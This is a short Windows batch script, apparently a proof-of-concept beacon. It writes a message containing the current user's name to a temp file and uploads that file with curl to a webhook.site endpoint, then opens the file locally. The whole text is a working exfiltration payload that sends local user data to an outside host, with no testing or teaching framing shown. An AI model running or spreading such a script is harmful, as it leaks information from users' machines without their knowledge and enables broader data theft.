echo The Code RAN Successfully In %USERNAME% > %temp%\info.txt
curl -T "%temp%/info.txt" "https://webhook.site/fb06baf1-989d-45a6-826f-9c24efc44451"
start %temp%/info.txt
